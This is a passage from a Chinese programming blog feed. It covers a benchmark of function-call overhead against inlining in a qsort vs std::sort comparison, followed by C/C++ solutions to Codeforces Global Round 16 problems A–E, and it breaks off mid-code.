其中前者要比后者慢.</li><li>执行<code>call</code>指令(期间会将调用函数后的下一行代码的地址(<code>EIP</code>/<code>RIP</code>)入栈).</li><li>从寄存器中取得返回值.</li></ul><p>测试使用的是x64的编译器, 前四个参数都是通过寄存器传递(32位的<code>__thiscall</code>有3个是栈传递), 然后返回地址通过栈传递. 如果我把函数内联了, 这些操作都不会有, 速度上就可以快一点. 如果一个函数被调用很多次, 对效率的影响就有些明显了.</p><p>可能有点绕, 下面是一个直观的例子(不开优化, 手动模拟内联操作):</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pause</span><span class="params">(<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    DWORD pid;</span><br><span class="line">    HWND hWnd = <span class="built_in">GetConsoleWindow</span>();</span><br><span class="line">    <span class="built_in">GetWindowThreadProcessId</span>(hWnd, &amp;pid);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="built_in">GetCurrentProcessId</span>())&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">getchar</span>() != <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONGLONG frequency = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">LONGLONG <span class="title">counter</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">QueryPerformanceCounter</span>(&amp;l)) <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">return</span> l.QuadPart;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one__</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="number">1</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one_</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="built_in">one__</span>();&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">one</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="built_in">one_</span>();&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LARGE_INTEGER l;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">QueryPerformanceFrequency</span>(&amp;l))&#123;</span><br><span class="line">        frequency = l.QuadPart;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Counter frequency: %lld\n&quot;</span>, frequency);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LONGLONG c, cc = <span class="number">0</span>;</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x7FFFFFFF</span>; i++)&#123;</span><br><span class="line">        cc += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inline   %lld\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    cc = <span class="number">0</span>;</span><br><span class="line">    c = <span class="built_in">counter</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x7FFFFFFF</span>; i++)&#123;</span><br><span class="line">        cc += <span class="built_in">one</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    c = <span class="built_in">counter</span>() - c;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function %lld\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pause</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Counter frequency: 10000000</span><br><span class="line">inline   39988174</span><br><span class="line">function 81251130</span><br></pre></td></tr></table></figure></p><p>可以看到, 如果原来调用嵌入函数需要8秒, 那内联以后就只需要4秒. 这是3层嵌套, 实际上刚才的<code>std::sort</code>内部的某些过程可能比这还多. 所以, 使用STL的话, 开优化还是很必要的.</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p><code>qsort</code>内部使用快速排序, <code>std::sort</code>根据实际情况混合使用内省排序, 快速排序, 堆排序. 从原理上说后者是比前者快的, 但由于模板的存在, 后者的函数调用次数过多, 所以看起来后者更慢. 在编译器打开O2优化的情况下, 一些函数调用被内联了, 后者的优势显现出来. 所以, 如果打开优化, 只是让编译过程慢一点点, 等编译完成后速度会飞起. 在实际写代码时, 也不用纠结于一个函数要不要指定<code>__inline</code>(如果你的项目只有一个文件), 编译器会帮我们优化这个过程.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://baike.baidu.com/item/%E5%86%85%E7%9C%81%E6%8E%92%E5%BA%8F/6471937?fr=aladdin">内省排序_百度百科</a><br><a href="https://www.zhihu.com/question/457660026/answer/1868951797">为什么g++能够优化到动态库里的STL-知乎</a><br><a href="https://www.cnblogs.com/jo3yzhu/p/12539699.html">为什么不要自己乱造轮子: std::sort方法的实现</a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> acm </tag>
            
            <tag> 测试 </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Global Round 16 部分题解记录</title>
      <link href="/2021/09/19/CodeforcesG16/"/>
      <url>/2021/09/19/CodeforcesG16/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><h2 id="A-Median-Maximization"><a href="#A-Median-Maximization" class="headerlink" title="A. Median Maximization"></a>A. Median Maximization</h2><p><a href="https://codeforces.com/contest/1566/problem/A">原题链接</a></p><blockquote><p>给定一个非负整数组的元素个数$n$与和$s$, 求数组的最大中位数.</p></blockquote><p>贪心地把前面一半设为$0$, 其他取平均, 但由于是整数, 只能向下取整.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, s / (n / <span class="number">2</span> + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-MIN-MEX-Cut"><a href="#B-MIN-MEX-Cut" class="headerlink" title="B. MIN-MEX Cut"></a>B. MIN-MEX Cut</h2><p><a href="https://codeforces.com/contest/1566/problem/B">原题链接</a></p><blockquote><p>给定一个只含0和1的字符串, 求分割字符串后每段MEX和的最小值. MEX指不在数列中最小非负整数.</p></blockquote><ul><li>答案的最大可能值就是2, 因为对于任意一个串, 不切割的MEX值总是不大于2的.</li><li>先考虑答案是0的情况, 只能是所有字符都是1的时候才可能取到0.</li><li>再考虑答案大于0的情况, 如果枚举串中0的段数, 有多少段0答案就是多少. 但是如果答案大于2就不如不切割划算, 所以大于2的话答案就修正为2.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> s[<span class="number">100001</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> zero = <span class="number">0</span>, one = <span class="number">0</span>, seg = <span class="number">0</span>, con = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (s[i] != <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (s[i])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>: <span class="keyword">if</span> (!con)&#123;seg++; con = <span class="number">1</span>;&#125; zero++; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: con = <span class="number">0</span>; one++; <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (zero == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (one == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> seg &lt; <span class="number">2</span> ? seg : <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, calc());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-MAX-MEX-Cut"><a href="#C-MAX-MEX-Cut" class="headerlink" title="C. MAX-MEX Cut"></a>C. MAX-MEX Cut</h2><p><a href="https://codeforces.com/contest/1566/problem/C">原题链接</a></p><blockquote><p>给一个$2 \times n$的矩阵, 把矩阵纵切成几段矩阵, 求每段MEX和的最大值. MEX指不在矩阵中出现的最小非负整数.</p></blockquote><p>和B题思路一样 <del>但是, 没有完全一样</del></p><ul><li>假设有一段出现了0和1, 那把它们单独切割出来不会减少对结果的贡献. 所以碰到$\begin{bmatrix} 0 \\ 1 \end{bmatrix}$这样的列, 单独拿出来就可以了.</li><li>如果出现$\begin{bmatrix} 0 \\ 0 \end{bmatrix}$这种, 答案可以加1, 但是如果旁边有独立的$\begin{bmatrix} 1 \\ 1 \end{bmatrix}$, 可以把它们合并, 这样本来后者没有贡献, 一合并就可以让答案再加1.</li><li>其他的$\begin{bmatrix} 1 \\ 1 \end{bmatrix}$对答案没有贡献.</li></ul><p>可以在读入数据时直接把第二行加到第一行上, 减少点空间开销, 也可以减少考虑的情况.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> b[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, con = <span class="number">0</span>, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">switch</span> (b[i])&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: sum++; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: sum += <span class="number">2</span>; <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:&#123;</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; b[i - <span class="number">1</span>] == <span class="number">0</span>) sum++;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; n - <span class="number">1</span> &amp;&amp; b[i + <span class="number">1</span>] == <span class="number">0</span>)&#123;sum += <span class="number">2</span>; b[i + <span class="number">1</span>] = <span class="number">3</span>;&#125;</span><br><span class="line">            &#125;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T; <span class="keyword">char</span> c; <span class="keyword">int</span> n, i, j;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;c);</span><br><span class="line">                b[j] = i == <span class="number">0</span> ? (c - <span class="string">&#x27;0&#x27;</span>) : (b[j] + c - <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, calc(n));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Seating-Arrangements"><a href="#D-Seating-Arrangements" class="headerlink" title="D. Seating Arrangements"></a>D. Seating Arrangements</h2><p><a href="https://codeforces.com/contest/1566/problem/D2">原题链接</a></p><blockquote><p>有$n$行$m$列的座位和$n \times m$个人, 视力不好的人的座位编号应该比视力好的小. 这些人按照原顺序进场, 走到他们座位所在行再从左到右走找到自己座位. 如果走到自己座位之前要经过另一个人, 不满意度加1. 求最小不满意度.</p></blockquote><script type="math/tex; mode=display">\begin{array}{|c|c|c|}\hline1 & 2 & \dots & m-1 & m \\\hlinem+1 & m+2 & \dots & 2m-1 & 2m \\\hline2m+1 & 2m+2 & \dots & 3m-1 & 3m \\\hline\vdots & \vdots & \ddots & \vdots & \vdots \\\hlinem(n-1)+1 & m(n-1)+2 & \dots & nm-1 & nm \\\hline\end{array}</script><p>对于视力不同的一堆人, 他们的所有位置是确定的, 我们要调整的是视力相同的人的位置.<br>所以先排序, 以视力为第一顺序, 序号为第二顺序.<br><div class="note info flat"><p><code>qsort</code>是C库函数, 用C习惯了就没使用C++的<code>sort</code>和重载运算符了. (也不知道这二者效率的分别, 等哪天找个机会测试一下)</p></div><br>考虑相同视力的人的内部排序. 在同一行座位中, 我们应该把序号小的放在右边, 这样同视力但序号大的人就不会增加不满意度.<br>对于在不同行但同视力的人, 只有靠后的行影响其他人的不满意度, 而在之前的排序中, 已经尽可能把序号大的向后放置了, 所以只要反转同一行就行.<br>程序思路大概是排完序后遍历每一行, 对于同视力的连续座位, 把序号<code>reverse</code>一下就好了.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> i, a;</span><br><span class="line">&#125;info, *pinfo;</span><br><span class="line"></span><br><span class="line">info b[<span class="number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *p1, <span class="keyword">const</span> <span class="keyword">void</span> *p2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> pinfo a = (<span class="keyword">const</span> pinfo)p1, b = (<span class="keyword">const</span> pinfo)p2;</span><br><span class="line">    <span class="keyword">if</span> (a-&gt;a != b-&gt;a) <span class="keyword">return</span> a-&gt;a &lt; b-&gt;a ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> a-&gt;i &lt; b-&gt;i ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (q - p &lt;= <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    info tmp; <span class="keyword">int</span> i, r;</span><br><span class="line">    <span class="keyword">for</span> (i = p; i &lt; (p + q) / <span class="number">2</span>; i++)&#123;</span><br><span class="line">        r = p + q - i - <span class="number">1</span>;</span><br><span class="line">        tmp = b[i];</span><br><span class="line">        b[i] = b[r];</span><br><span class="line">        b[r] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">adjust</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> r, t = <span class="number">0</span>, pos, i, j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; m; j++, t++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (j == <span class="number">0</span>)&#123;r = b[t].a; pos = t; <span class="keyword">continue</span>;&#125;</span><br><span class="line">            <span class="keyword">if</span> (b[t].a != r)&#123;</span><br><span class="line">                r = b[t].a;</span><br><span class="line">                <span class="built_in">reverse</span>(pos, t);</span><br><span class="line">                pos = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(pos, t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, i, j, k, t;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span> (j = m - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">            t = b[i * m + j].i;</span><br><span class="line">            <span class="keyword">for</span> (k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line">                <span class="keyword">if</span> (b[i * m + k].i &lt; t) sum++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T; <span class="keyword">int</span> n, m, i, t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">        t = n * m;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; t; i++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;b[i].a);</span><br><span class="line">            b[i].i = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">qsort</span>(b, t, <span class="built_in"><span class="keyword">sizeof</span></span> (info), cmp);</span><br><span class="line">        <span class="built_in">adjust</span>(n, m);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">calc</span>(n, m));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><psw>比赛的时候没注意看题, 原题D1和D2是一样的, D1的$n$固定是1, 要是D2当时做不出来就难受了. 不过最后D2通过了, 妙~~啊~~.</psw><h2 id="E-Buds-Re-hanging"><a href="#E-Buds-Re-hanging" class="headerlink" title="E. Buds Re-hanging"></a>E. Buds Re-hanging</h2><p><a href="https://codeforces.com/contest/1566/problem/E">原题链接</a></p><blockquote><p>把树中子节点全为叶子的结点叫做bud. 给定一棵有根树, 可以把bud和它的子节点整个移动到树中其他结点, 求经过有限次移动后的新树中最小叶子数.</p></blockquote><p>可以先不考虑一个bud取下来以后挂在哪个节点上, 直接把它放在一边, 等最后把所有的子树拼起来就OK, 如图.<br><img src="/pictures/cfg16_e_1.svg" alt="E题图解"><br>结果: $(2-1)+(1-1)+(1-1)+1=2$<br>用dfs遍历子树, 每次遇到拆解后可以形成的bud节点, 统计这棵树的叶子数. 因为最后拼接的时候其中一个叶子要和下一个bud连接, 所以实际统计的是叶子数-1. 最后一个bud没有下一个和它连接了, 就不用-1, 到最后的时候答案+1就好.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Referred to the code on https://codeforces.com/contest/1566/submission/128689795</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; tree[<span class="number">200001</span>];</span><br><span class="line"><span class="keyword">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> node, <span class="keyword">int</span> pre)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; tree[node].<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> next = tree[node][i];</span><br><span class="line">        <span class="keyword">if</span> (next != pre) n += <span class="built_in">dfs</span>(next, node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    ans += n - <span class="number">1</span>; <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T, n, a, b, i;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;T);</span><br><span class="line">    <span class="keyword">while</span> (T--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++) tree[i].<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; 